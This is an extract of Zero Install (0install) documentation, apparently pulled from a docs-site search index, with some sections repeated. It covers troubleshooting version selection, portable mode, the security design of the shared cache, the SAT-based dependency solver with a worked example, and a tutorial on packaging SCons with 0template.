For example: $ 0install run --refresh https://apps.0install.net/gui/vlc.xml 0install doesn't select any versions / the expected versions \u00b6 If 0install cannot find a compatible set of versions for a program, you may see an error like this: Or, if not using the GUI, like this: Can ' t find all required implementations: - https://apps.0install.net/java/swt.xml -> ( problem ) http://www.serscis.eu/0install/serscis-access-modeller 0 .15.1 requires 3 .7 < = version - https://apps.0install.net/utils/graphviz.xml -> 2 .28.0-3.2.3 ( package:rpm:graphviz:2.28.0-3.2.3:i586 ) - https://apps.0install.net/java/jre.xml -> 6 .18-1.8.7-2 ( sha1new = 6b7c9f98bd1d8bec5bbb5ddb41271c862c8e8529 ) - https://apps.0install.net/java/iris.xml -> 0 .6.0 ( sha1new = daf7bfada93ec758baeef1c714f3239ce0a5a462 ) - http://www.serscis.eu/0install/serscis-access-modeller -> 0 .15.1 ( sha1new = 7899dbe75c1c332c4e70f272b2d76026714392a6 ) User requested 0 .10 < = version To find the cause, start by double-clicking on \"(problem)\" in the GUI to get the list of available versions for that component. Right-click over the version you think it should have chosen and choose \"Explain this decision\" from the menu: In this example, the user requested serscis-access-modeller >= 0.10 and all such versions needed SWT >= 3.7 so there was no possible selection (note: this conflict was invented for the sake of this tutorial). The line \"User requested implementation ...\" shows the version which was selected from the list; the solver was constrained to choose this version. There are several common causes: There is no binary for your platform (e.g. you are using 32-bit Windows, but there are only binaries for 64-bit Linux). In this case, you can use 0install to compile a new binary from source (if source is provided in the feed). See 0compile for details. If no source is provided, you will need to go to the project's web-site and compile manually. The dependency is only provided by distribution packages, and your distribution isn't listed Have a look at the feed's XML (View Page Source in your browser) to see if your distribution package is listed. See Distribution Integration for details. Sometimes, the failure to select a version is due to complex inter-dependencies between components. If a valid set of versions exists, 0install will always find it, but if no valid set exists then it can be hard for it to explain why. Rather that showing a proof that none of the billions of possible combinations is valid, 0install tries to find the best example of a failed selection to show you. It works like this: When the solve fails, 0install switches to debug mode and runs the solve again. Debug mode adds a fake implementation of each component. This fake version is fully compatible with everything, but less preferable than all the real versions (so it will only be selected if there is no other option). This always results in a \"solution\", but whenever a fake implementation is selected it is reported as \"(problem)\", as shown above. This is quite good at suggesting where the fault is, but the problem may be elsewhere. For example, if a program has versions available for Python 3 and Python 2, and you only have Python 2, then 0install should select the Python 2 version. But if it can't find any valid selections (because some other library required for the Python 2 version is missing), then it might report that the lack of Python 3 is the issue (when, in fact, that's just one possible way of fixing the problem). To investigate further, you can use the --version-for option to fix the versions of multiple components. For example, to find out why you can't run 0compile 1.1 with 0publish 0.20 and 0install 2.1: $ 0install select -c http://0install.net/2006/interfaces/0compile.xml --version 1 .1 \\ --version-for http://0install.net/2006/interfaces/0publish 0 .20 \\ --version-for http://0install.net/2007/interfaces/ZeroInstall.xml 2 .1 Can ' t find all required implementations: - http://0install.net/2006/interfaces/0compile.xml -> 1 .1 ( sha1new = 5d11d6a774f261b408f3c57dce8819481d842f90 ) User requested version 1 .1 - http://0install.net/2006/interfaces/0publish -> 0 .20 ( sha1new = 3a62c59321720a1736899dec9ef7deb0b29b7b43 ) User requested version 0 .20 - http://0install.net/2007/interfaces/ZeroInstall.xml -> ( problem ) http://0install.net/2006/interfaces/0compile.xml 1 .1 requires 2 .1 < = version http://0install.net/2006/interfaces/0publish 0 .20 requires version < 1 .11-post User requested version 2 .1 No usable implementations satisfy the restrictions: /home/tal/Projects/zero-install/0install ( 2 .1-post ) : Incompatible with user-specified requirements sha1new = 4f860b217bb94723ad6af9062d25dc7faee6a7ae ( 2 .1 ) : incompatible with restrictions sha1new = 3fa607f49966f7eb00682336a4391c78d13a3d8b ( 2 .0 ) : Incompatible with user-specified requirements sha1new = cc7a0dcf44d42714bcf1efd27e8ec1f1810ce7da ( 1 .16 ) : Incompatible with user-specified requirements sha1new = ab6ca6165cd57a1bb95ddf5af9c51cdf325e1db8 ( 1 .15 ) : Incompatible with user-specified requirements ... - https://apps.0install.net/python/python.xml -> 2 .7.3-4 ( package:arch:python2:2.7.3-4:x86_64 ) Here, we can see that 0publish 0.20 requires an old version of 0install, while 0compile 1.1 requires a newer one. Why is this environment variable set? \u00b6 When you run a program, each component (library) can ask for certain environment variables to be set (this only affects the program being run, not all programs). If variables are being set incorrectly, you'll need to track down why. e.g. $ sam Picked up _JAVA_OPTIONS: -XstartOnFirstThread Unrecognized option: -XstartOnFirstThread Could not create the Java virtual machine. To debug this, ask 0install to output the selections as XML and look for the setting inside it. xmllint is useful to format the XML nicely: $ 0install select --xml sam | xmllint --format - > selections.xml (if sam is an old-style alias rather than an app, use alias:sam instead) In this case, we find the selections.xml document contains: <selection arch= \"MacOSX-x86_64\" version= \"3.6.1\" interface= \"https://apps.0install.net/java/swt.xml\" ... > ... <environment mode= \"prepend\" name= \"_JAVA_OPTIONS\" separator= \" \" value= \"-XstartOnFirstThread\" /> </selection> This tells us that the OS X implementation of version 3.6.1 of the SWT library requested this setting.

Right-click over the version you think it should have chosen and choose \"Explain this decision\" from the menu: In this example, the user requested serscis-access-modeller >= 0.10 and all such versions needed SWT >= 3.7 so there was no possible selection (note: this conflict was invented for the sake of this tutorial). The line \"User requested implementation ...\" shows the version which was selected from the list; the solver was constrained to choose this version. There are several common causes: There is no binary for your platform (e.g. you are using 32-bit Windows, but there are only binaries for 64-bit Linux). In this case, you can use 0install to compile a new binary from source (if source is provided in the feed). See 0compile for details. If no source is provided, you will need to go to the project's web-site and compile manually. The dependency is only provided by distribution packages, and your distribution isn't listed Have a look at the feed's XML (View Page Source in your browser) to see if your distribution package is listed. See Distribution Integration for details. Sometimes, the failure to select a version is due to complex inter-dependencies between components. If a valid set of versions exists, 0install will always find it, but if no valid set exists then it can be hard for it to explain why. Rather that showing a proof that none of the billions of possible combinations is valid, 0install tries to find the best example of a failed selection to show you. It works like this: When the solve fails, 0install switches to debug mode and runs the solve again. Debug mode adds a fake implementation of each component. This fake version is fully compatible with everything, but less preferable than all the real versions (so it will only be selected if there is no other option). This always results in a \"solution\", but whenever a fake implementation is selected it is reported as \"(problem)\", as shown above. This is quite good at suggesting where the fault is, but the problem may be elsewhere. For example, if a program has versions available for Python 3 and Python 2, and you only have Python 2, then 0install should select the Python 2 version. But if it can't find any valid selections (because some other library required for the Python 2 version is missing), then it might report that the lack of Python 3 is the issue (when, in fact, that's just one possible way of fixing the problem). To investigate further, you can use the --version-for option to fix the versions of multiple components. For example, to find out why you can't run 0compile 1.1 with 0publish 0.20 and 0install 2.1: $ 0install select -c http://0install.net/2006/interfaces/0compile.xml --version 1 .1 \\ --version-for http://0install.net/2006/interfaces/0publish 0 .20 \\ --version-for http://0install.net/2007/interfaces/ZeroInstall.xml 2 .1 Can ' t find all required implementations: - http://0install.net/2006/interfaces/0compile.xml -> 1 .1 ( sha1new = 5d11d6a774f261b408f3c57dce8819481d842f90 ) User requested version 1 .1 - http://0install.net/2006/interfaces/0publish -> 0 .20 ( sha1new = 3a62c59321720a1736899dec9ef7deb0b29b7b43 ) User requested version 0 .20 - http://0install.net/2007/interfaces/ZeroInstall.xml -> ( problem ) http://0install.net/2006/interfaces/0compile.xml 1 .1 requires 2 .1 < = version http://0install.net/2006/interfaces/0publish 0 .20 requires version < 1 .11-post User requested version 2 .1 No usable implementations satisfy the restrictions: /home/tal/Projects/zero-install/0install ( 2 .1-post ) : Incompatible with user-specified requirements sha1new = 4f860b217bb94723ad6af9062d25dc7faee6a7ae ( 2 .1 ) : incompatible with restrictions sha1new = 3fa607f49966f7eb00682336a4391c78d13a3d8b ( 2 .0 ) : Incompatible with user-specified requirements sha1new = cc7a0dcf44d42714bcf1efd27e8ec1f1810ce7da ( 1 .16 ) : Incompatible with user-specified requirements sha1new = ab6ca6165cd57a1bb95ddf5af9c51cdf325e1db8 ( 1 .15 ) : Incompatible with user-specified requirements ... - https://apps.0install.net/python/python.xml -> 2 .7.3-4 ( package:arch:python2:2.7.3-4:x86_64 ) Here, we can see that 0publish 0.20 requires an old version of 0install, while 0compile 1.1 requires a newer one.","title":"0install doesn't select any versions / the expected versions"},{"location":"details/troubleshooting/#why-is-this-environment-variable-set","text":"When you run a program, each component (library) can ask for certain environment variables to be set (this only affects the program being run, not all programs).

Portable mode \u00b6 To set up Zero Install on a USB thumb drive: Connect a thumb drive to the computer and make sure there are no files you still need on it. Format the thumb drive with NTFS (FAT32 will not work, see technical details for explanation). Download and run Zero Install for Windows. Select \"Tools\" and \"Portable Creator\" at the bottom of the window. Follow the instructions on screen. You can now use your thumb drive to run Zero Install on any computer running a recent version of Windows. Zero Install stores downloaded applications directly on the stick so you can access the same applications everywhere. Please remember to always \"eject\" the thumb drive in Windows before disconnecting it from the computer. Limitations \u00b6 The applications launched by Zero Install are not automatically made portable by this. They still store their settings in the usual locations.

Terminology Zero Install is based on the principle of Dependency Injection , and is sometimes therefore referred to as the injector . Everything 0install downloads from the net by default goes in ~/.cache/0install.net/ . Every archive it downloads unpacks into its own directory inside this. So, there's one directory for ROX-Filer, and another for ROX-Session, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs. The injector doesn't store anything else, except a few configuration details (such as whether you want to check for updates automatically), which go in ~/.config/0install.net/ . Installation never causes any mysterious changes with other files, as happens with some other installation systems. The idea is that you don't need to backup ~/.cache , because you can always download the stuff again. For example, if you delete the whole ~/.cache/0install.net/ directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it. You shouldn't modify anything in there. If sharing is enabled, then Zero Install stores downloaded implementations in /var/cache/0install.net/ instead of in ~/.cache/0install.net/ . This allows sharing between users. The use of cryptographic digests (described below) makes this safe; users don't need to trust each other not to put malicious code in the shared cache. Requirements \u00b6 Any user can run any program they want, without it needing to be installed first. Users refer to programs by globally unique names (URLs). So, a user asks to run \"http://gimp.org/gimp\", rather than the rather vague \"The Gimp\". Users can run whatever version of a program they want. Users don't need the root password. Users don't need to trust each other. The system administrator doesn't have to trust the users. Any developer can make software available through the system (without needing the blessing of some distribution first). Security and sharing \u00b6 To clarify the security requirements: the injector is designed to support this situation: There are two users. The system administrator doesn't trust either with root permission. The users don't trust each other. Both users want to run (the same version of) the Gimp. The Gimp must only be downloaded and stored on disk once. Current systems make you choose either: Inefficient (two copies downloaded and installed), or Insecure (second user must trust first user to get and install a good copy). Although this situation obviously occurs in schools, libraries, etc, solving it is also useful in the home. Although you might expect family members to trust each other, remember that trust includes trusting them not to get infected with viruses, etc. If my brother gets some spyware and then installs the Gimp, I shouldn't get infected too. This also applies if you're doing sandboxing within a single user account, or using a dedicated 'sandbox' user for some tasks. The injector's solution \u00b6 First, users need some way to specify what they want to run exactly. \"Run the Gimp\" is too vague (good gimp or evil gimp?), so we use URLs. If both users say \"Run gimp.org/gimp\" then the system is smart enough to only get it once. If one user says \"Run evil.com/gimp\" and one says \"Run gimp.org/gimp\", the system downloads both programs. Clearly, something has to actually download the software. It can either be one of the users, or a system daemon. The original Zero Install used a system daemon running as its own user, but the current (\"injector\") Zero Install has one of the users download the software. This is nicer, because they can do things like use a mirror or a CD to get the archives. The user uses a setuid (to zeroinstall ) program to copy the downloaded (unpacked) directory into the shared cache in a location derived from a secure hash of its contents. See the Sharing page for details. Policies \u00b6 A running process is created by combining many different libraries (and other components). In the Zero Install world, we have all versions of each library available at all times. The problem then is how to choose which versions to use. Some examples of ways to choose: The very latest version. The latest version in the cache (eg, when off-line). The latest stable version. The version recommended by your distribution. A version not affected by a known security flaw. The version you've always used in the past. A development version you are working on yourself. One way to organise things is to have a component link directly to particular versions of the components on which it depends. So, running Memo 2.0.0 might always use pygtk-2.0.0 and Python 2.2.0. But we often want to use the same component with different versions of its dependencies. For example, when Python 2.2.1 comes out with bug-fixes, we will want Memo to use it automatically. The injector solves this problem by selecting components to meet a program's requirements, according to rules specified by the user: Zero Install uses a SAT solver with conflict-driven learning to find the optimal solution quickly. See The 0install SAT Solver for details. Interfaces and Implementations \u00b6 An interface describes what something does (eg, \"Simple text editor\"). An implementation is something that does it (eg, Edit-1.9.6 or Edit-1.9.7). A feed file is a list of implementations of an interface. In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib Each implementation of an interface is identified by a cryptographic digest, eg: sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889 sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0 When we run a program (like Edit) we need to choose an implementation of every interface on which it depends. Then, we need to tell the program where to find them all; this process is known as Dependency Injection (or Inversion of Control ). Both tasks are handled by the injector. This takes as input an interface and chooses an implementation based on the policy. By default, the list of implementations of an interface is found by using the interface's name as a URL and downloading the XML feed file it names (click on one of the interfaces above to see what a feed file looks like). Additional feeds (local or remote) can be added manually by the user. Versions \u00b6 An implementation (in the Zero Install sense) is always some particular version. We identify implementations with a cryptographic hash of their contents. Therefore, two releases with the same version number are still considered as separate implementations if they differ in any way. A version is a sequence of dot-separated lists of integers, each followed by an optional modifier. e.g. \"1.2.3-pre4\". It can be just a single number (\"1\") or a sequence of any number of components (\"1.4-rc3.4-post\"). The modifiers are \"-pre\", \"-rc\", \"-\" and \"-post\". Versions are ordered like this: 1 1.1-pre7 1.1-rc3 1.1 1.1-1 1.1-post 1.1.1 1.2 1.2.1 1.2.1.4 1.2.2 3 The injector doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). This is a little different to some other systems, where numbers in different places have different meanings. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface. Eg: http://gtk.org/gtk-1.2.xml (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/gtk-2.0.xml (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...) Stability \u00b6 The feed file should also give a stability rating for each implementation. The following levels are allowed: Stable Testing Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability should be set to Testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to Stable so that everyone will use it. If problems are found, it can instead be marked as Buggy , or Insecure . The injector won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. You can use the Preferred Stability setting in the interface dialog to choose which versions to use. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu. User-set ratings are shown in capitals. As you make changes to the policy and ratings, the order of the implementations in the list will change. The version in bold is the one that 0install will actually use. In addition to the ratings about, you can set the rating to Preferred . Such versions always come first, unless they're not cached and you are in Off-line mode. Note If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first. Dependencies \u00b6 The feed file also lists the dependencies of each implementation; the injector locates an implementation of each dependency, recursively. All information about dependencies is handled at the interface level; this is because the same implementation may be used in different ways. Also, for software not specially designed for use with the injector, it allows us to keep the implementation in its original form. This diagram shows some dependencies for Memo (the dotted lines): The injector will also examine the dependencies of ROX-Lib and Python recursively.

Choosing the best set of versions from the billions of potential combinations is the job of the Solver module. The 0install solver is an adaptation of the OPIUM algorithm (Optimal Package Install/Uninstall Manager). Background \u00b6 OPIUM was designed as a replacement solver for Debian's apt-get. With apt-get, if two programs depend on different versions of the same library, they can't both be installed at once. When you try to install one, apt-get will first uninstall the other. Sometimes this is unavoidable, but in other cases there is a choice of dependency. The choices apt-get makes determine which other packages must be uninstalled, but it doesn't always find the best solution (or even any solution at all). OPIUM solved this problem by ensuring that the best available choice was always made. 0install has a slightly different problem. In 0install, every package is unpacked to its own directory. Libraries are shared when possible (two programs depend on the same version), and installed in parallel otherwise. Therefore, installing one program with 0install never requires uninstalling another. However, it is still possible for the dependencies within a single program to conflict with each other. For example, a Python program may depend on \"python2.5 or python2.6\", but a library it uses may only work with one of them. When running that particular program, 0install must choose a version of Python and a version of the library that are compatible. While apt-get has to look for conflicts across a very large number of packages (every package installed or being considered for installation), 0install only has to consider the packages needed for the program being run, but it must look at a large number of different possible versions for each package. Before 2010, 0install used a simple non-backtracking solver, which was possible because most packages had only a few dependencies. Because exactly the same set of versions was available to everyone, if a program was installable by its author then it would be installable everywhere, and even if some dependencies did conflict it was easy enough to list them in some order so that 0install always got a solution. But a couple of things made life more complicated... Multi-arch support A typical modern 64-bit system is also capable of running 32-bit code. However a single program must be either entirely 64-bit or entirely 32-bit. We can't, for example, select a 64-bit version of libgtk and a 32-bit version of Python for a single application. In other words, every 64-bit binary conflicts with every 32-bit binary, which means we have to deal with a lot more conflicts these days. Native packages The Sugar developers wanted their 0install packages to depend on existing distribution packages in many cases. The normal way to do this is to provide a 0install download of the dependency (e.g Python 2.6) yourself, but tell 0install it can use a distribution package instead if available. However, the Sugar developers (quite reasonably) wanted to avoid packaging Python at all and depend only on the distribution package. Because Python isn't binary-compatible across versions, they publish separate builds of their software for each version of Python and relied on 0install to choose the one that will work with their users' distributions. These kinds of problems can't be solved using older versions of 0install. The solver would choose the Python 2.6 version of the main program (for example) and then try to select a version of Python 2.6 to go with it. If the distribution only had Python 2.5, this would fail. Aleksey Lim from the Sugar project worked around this problem by adding backtracking to the solver . However, this becomes very slow when there are many possible combinations of versions to consider. Adapting the OPIUM algorithm \u00b6 Initially, I tried following the OPIUM paper closely. There, they represent each possible version of each package as a variable which is 1 if the package is to be installed and 0 if not. They make a list of constraints (expressions that must be true). For example, if we want to select a version of Firefox (either 3.5 or 3.6, but not both at once) we would write: firefox3.5 + firefox3.6 = 1 If Firefox 3.6 depends on GTK >= 2.18 then we can express that dependency as: gtk2.18.0 + gtk2.18.1 + gtk2.18.2 - firefox3.6 >= 0 This expression can be satisfied by either not choosing Firefox 3.6 (firefox3.6 = 0) or by choosing a compatible version of GTK to go with it. After writing out all these expressions, we pass them all to a pseudo-boolean constraint solver (I tested with minisat+ ). We also give it a cost function to minimise (e.g. selecting older versions \"costs\" more, so it chooses newer versions where possible). The solver then tells us which variables should be 1, and these are the versions to use. This scheme worked, but it turned out to be quite slow. The problem was the cost function: most combinations have a similar cost, which makes it difficult for the solver to narrow the search down quickly. There could even be several solutions with the same cost, so you might get a different set of versions every time you ran it! The solution was to optimise one component at a time: Solve, optimising for the \"best\" version of Firefox that could be part of a valid selection . Then solve again, for the \"best\" version of GTK that can be part of a valid combination with the previously selected version of Firefox. ... and so on recursively until we have selected a version of every component we need. In fact, we don't need to use a cost function at all. We can just ask whether there is any valid combination involving the best version of Firefox. If not, we ask again for the second best version, etc. The problem can then be simplified to plain old Boolean satisfiability and implemented efficiently. A DPLL-based algorithm with conflict-driven learning turned out to be very fast, even implemented in pure Python . Worked example \u00b6 Consider the following case (we're trying to run \"prog\", of which there are two versions available): prog-1 requires lib-1 or lib-2 prog-2 requires lib-2 lib-1 requires python-2 lib-2 requires python-3 python-3 isn't available We first encode these rules into a set of binary expressions to be satisfied: Requirement Boolean expression prog-1 requires lib-1 or lib-2 lib-1 or lib-2 or !prog-1 prog-2 requires lib-2 lib-2 or !prog-2 lib-1 requires python-2 python-2 or !lib-1 lib-2 requires python-3 python-3 or !lib-2 python-3 isn't available !python-3 In addition, there are some constraints we always have: we must select a version of the program, and we can't select two different versions of any interface: Requirement Boolean expression must select some prog prog-1 or prog-2 only one prog at_most_one(prog-1, prog-2) only one lib at_most_one(lib-1, lib-2) only one python at_most_one(python-2, python-3) Note We could express at_most_one(a, b) as \"!a or !b\", but that scales badly when there are lots of versions, so our SAT solver adds at_most_one as a primitive. Now the solve proceeds as follows: Find \"unit\" clauses. Here we find \"!python3\". Simplify all rules containing python3 to get: lib-1 or lib-2 or !prog-1 lib-2 or !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) at_most_one(lib-1, lib-2) We now have a new unit clause: \"!lib-2\". Simplify again: lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) Now we have \"!prog-2\": lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 Now we have \"prog-1\", which gets us \"lib-1\", which leaves us with the solution: lib-1 !prog-2 python-2 !lib-2 !python-3 prog-1 0install will then run prog-1 with lib-1 and python-2. In the above case, we were able to solve the problem simply by simplifying. Sometimes, we reach a point where there are no unit-clauses left. In that case, we set one undecided variable to try the most optimal remaining combination. If that leads to a solution, we have the optimal solution. If it leads to a conflict, we use \"conflict driven learning\" to learn a general rule which would avoid us trying that path, backtrack, and resume. The learning system helps to avoid exploring similar wrong-paths as the solve continues. The key to making this work is picking the most optimal next variable. Each time we need to choose, we do a depth first search of the current dependency tree: if we haven't yet picked a version of prog then we try setting the best remaining one to true (e.g. \"prog-2 = true\"). If we've already picked a version of prog, we look at its first dependency (always lib in this case) and try the best version of that, and so on.

Libraries are shared when possible (two programs depend on the same version), and installed in parallel otherwise. Therefore, installing one program with 0install never requires uninstalling another. However, it is still possible for the dependencies within a single program to conflict with each other. For example, a Python program may depend on \"python2.5 or python2.6\", but a library it uses may only work with one of them. When running that particular program, 0install must choose a version of Python and a version of the library that are compatible. While apt-get has to look for conflicts across a very large number of packages (every package installed or being considered for installation), 0install only has to consider the packages needed for the program being run, but it must look at a large number of different possible versions for each package. Before 2010, 0install used a simple non-backtracking solver, which was possible because most packages had only a few dependencies. Because exactly the same set of versions was available to everyone, if a program was installable by its author then it would be installable everywhere, and even if some dependencies did conflict it was easy enough to list them in some order so that 0install always got a solution. But a couple of things made life more complicated... Multi-arch support A typical modern 64-bit system is also capable of running 32-bit code. However a single program must be either entirely 64-bit or entirely 32-bit. We can't, for example, select a 64-bit version of libgtk and a 32-bit version of Python for a single application. In other words, every 64-bit binary conflicts with every 32-bit binary, which means we have to deal with a lot more conflicts these days. Native packages The Sugar developers wanted their 0install packages to depend on existing distribution packages in many cases. The normal way to do this is to provide a 0install download of the dependency (e.g Python 2.6) yourself, but tell 0install it can use a distribution package instead if available. However, the Sugar developers (quite reasonably) wanted to avoid packaging Python at all and depend only on the distribution package. Because Python isn't binary-compatible across versions, they publish separate builds of their software for each version of Python and relied on 0install to choose the one that will work with their users' distributions. These kinds of problems can't be solved using older versions of 0install. The solver would choose the Python 2.6 version of the main program (for example) and then try to select a version of Python 2.6 to go with it. If the distribution only had Python 2.5, this would fail. Aleksey Lim from the Sugar project worked around this problem by adding backtracking to the solver . However, this becomes very slow when there are many possible combinations of versions to consider.","title":"Background"},{"location":"developers/solver/#adapting-the-opium-algorithm","text":"Initially, I tried following the OPIUM paper closely. There, they represent each possible version of each package as a variable which is 1 if the package is to be installed and 0 if not. They make a list of constraints (expressions that must be true). For example, if we want to select a version of Firefox (either 3.5 or 3.6, but not both at once) we would write: firefox3.5 + firefox3.6 = 1 If Firefox 3.6 depends on GTK >= 2.18 then we can express that dependency as: gtk2.18.0 + gtk2.18.1 + gtk2.18.2 - firefox3.6 >= 0 This expression can be satisfied by either not choosing Firefox 3.6 (firefox3.6 = 0) or by choosing a compatible version of GTK to go with it. After writing out all these expressions, we pass them all to a pseudo-boolean constraint solver (I tested with minisat+ ). We also give it a cost function to minimise (e.g. selecting older versions \"costs\" more, so it chooses newer versions where possible). The solver then tells us which variables should be 1, and these are the versions to use. This scheme worked, but it turned out to be quite slow. The problem was the cost function: most combinations have a similar cost, which makes it difficult for the solver to narrow the search down quickly. There could even be several solutions with the same cost, so you might get a different set of versions every time you ran it! The solution was to optimise one component at a time: Solve, optimising for the \"best\" version of Firefox that could be part of a valid selection . Then solve again, for the \"best\" version of GTK that can be part of a valid combination with the previously selected version of Firefox. ... and so on recursively until we have selected a version of every component we need. In fact, we don't need to use a cost function at all. We can just ask whether there is any valid combination involving the best version of Firefox. If not, we ask again for the second best version, etc. The problem can then be simplified to plain old Boolean satisfiability and implemented efficiently. A DPLL-based algorithm with conflict-driven learning turned out to be very fast, even implemented in pure Python .","title":"Adapting the OPIUM algorithm"},{"location":"developers/solver/#worked-example","text":"Consider the following case (we're trying to run \"prog\", of which there are two versions available): prog-1 requires lib-1 or lib-2 prog-2 requires lib-2 lib-1 requires python-2 lib-2 requires python-3 python-3 isn't available We first encode these rules into a set of binary expressions to be satisfied: Requirement Boolean expression prog-1 requires lib-1 or lib-2 lib-1 or lib-2 or !prog-1 prog-2 requires lib-2 lib-2 or !prog-2 lib-1 requires python-2 python-2 or !lib-1 lib-2 requires python-3 python-3 or !lib-2 python-3 isn't available !python-3 In addition, there are some constraints we always have: we must select a version of the program, and we can't select two different versions of any interface: Requirement Boolean expression must select some prog prog-1 or prog-2 only one prog at_most_one(prog-1, prog-2) only one lib at_most_one(lib-1, lib-2) only one python at_most_one(python-2, python-3) Note We could express at_most_one(a, b) as \"!a or !b\", but that scales badly when there are lots of versions, so our SAT solver adds at_most_one as a primitive. Now the solve proceeds as follows: Find \"unit\" clauses. Here we find \"!python3\". Simplify all rules containing python3 to get: lib-1 or lib-2 or !prog-1 lib-2 or !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) at_most_one(lib-1, lib-2) We now have a new unit clause: \"!lib-2\". Simplify again: lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) Now we have \"!prog-2\": lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 Now we have \"prog-1\", which gets us \"lib-1\", which leaves us with the solution: lib-1 !prog-2 python-2 !lib-2 !python-3 prog-1 0install will then run prog-1 with lib-1 and python-2. In the above case, we were able to solve the problem simply by simplifying. Sometimes, we reach a point where there are no unit-clauses left. In that case, we set one undecided variable to try the most optimal remaining combination. If that leads to a solution, we have the optimal solution. If it leads to a conflict, we use \"conflict driven learning\" to learn a general rule which would avoid us trying that path, backtrack, and resume. The learning system helps to avoid exploring similar wrong-paths as the solve continues. The key to making this work is picking the most optimal next variable. Each time we need to choose, we do a depth first search of the current dependency tree: if we haven't yet picked a version of prog then we try setting the best remaining one to true (e.g. \"prog-2 = true\"). If we've already picked a version of prog, we look at its first dependency (always lib in this case) and try the best version of that, and so on.","title":"Worked example"},{"location":"developers/solver/#the-ocaml-implementation","text":"The blog post Simplifying the Solver With Functors contains more information about the new OCaml implementation of the solver.","title":"The OCaml implementation"},{"location":"developers/using-git/","text":"Using Git \u00b6 Testing developer versions using Git \u00b6 If you want to work on the code, or test a fix that has just been made, you'll want to get the latest developer version.

New users may prefer to start with the graphical interface instead, but this version is useful when writing scripts to automatically publish new versions, or if you can't run the graphical version for some reason. We will start by packaging SCons, a build system (a little like Make). You should already be familiar with the general operation of 0install. In not, start by reading the Introduction tutorial . Introduction \u00b6 SCons is particularly easy to package, because it is designed to be bundled with other applications and used in their build process, and can therefore be executed in place right after unpacking. Programs that can be run in this way are the easiest to make available through Zero Install. To do this we need to create a small XML file stating: Which versions are available. Where each one can be downloaded from. How each version can be run. Any dependencies each version has on other packages. You can write this feed file with a text editor just by reading the file format specification , but it's easier to use the 0template command. 0template will create an initial template for you, check that the file is valid, and makes many operations easier. The command is, of course, available through Zero Install. To save typing its full URI each time you run it, create an app now: $ 0install add 0template http://0install.net/tools/0template.xml $ 0template --help usage: 0template.py [ -h ] [ -o OUTPUT ] [ --from-feed FROM_FEED ] template [ name = value [ name = value ... ]] [ ... ] See also: 0template SCons homepage Creating the template \u00b6 Run 0template now to create a new file called SCons.xml.template : $ 0template SCons.xml.template 'SCons.xml.template' does not exist ; creating new template. Does your program need to be compiled before it can be used? 1 ) Generate a source template ( e.g. for compiling C source code ) 2 ) Generate a binary template ( e.g. for a pre-compiled binary or script ) > 2 Writing SCons.xml.template 0template will create a new template, which you can open in a text editor. Fill in the fields in the XML template. The comments should guide you, but these are the exact changes we will make now: Set the summary to a short description. Start with a lower-case letter (except for proper nouns) and don't include the name of the program. The summary is normally shown after a dash, e.g. SCons - a software construction tool . The description fields can be longer. Copying some text from the project's web page often works well. Set the homepage to the program's main web-site (or to your own site if you have a page for it). This is where users will go if they want more information than is in the description. Don't forget to uncomment it by removing the <!-- and --> markers around it. Set the icon to the URL of a small PNG format icon if you want. Set the feed-for element to the URL where you plan to host the XML feed file. Since other programs that depend on this one will use the URL to find it, try to pick a URL that won't change. Set the license attribute to the project's license. Set the archive link to the download URL, with {version} as a place-holder for the version. The main program (which we ran above) is called scons.py , so change the path attribute to that. You can add any dependencies here too. The generated example is for a Python 3 program, and we can just leave that as it is. Your final version should look something like this: <?xml version=\"1.0\"?> <interface xmlns= \"http://zero-install.sourceforge.net/2004/injector/interface\" > <name> SCons </name> <summary> a software construction tool </summary> <description> SCons is a software construction tool (build tool substitute for Make) implemented in Python. It features a modular build engine that can be embedded in other software. SCons configuration files are Python scripts that call the build engine API. It can scan files to detect dependencies automatically and maintain a global view of all dependencies in a build tree, and uses MD5 signatures to detect changed file contents reliably. Timestamps can be used if you prefer. SCons also supports parallel builds and is easily extensible through user-defined builder and scanner objects. </description> <homepage> http://www.scons.org/ </homepage> <feed-for interface= \"http://example.com/scons.xml\" /> <group license= \"OSI Approved :: MIT/X Consortium License\" > <command name= \"run\" path= \"scons.py\" > <runner interface= \"https://apps.0install.net/python/python.xml\" > <version not-before= \"3\" /> </runner> </command> <implementation arch= \"*-*\" version= \"{version}\" > <manifest-digest/> <archive href= \"https://downloads.sourceforge.net/scons/scons-local-{version}.tar.gz\" /> </implementation> </group> </interface> This is a template, from which we can create instances for particular versions.

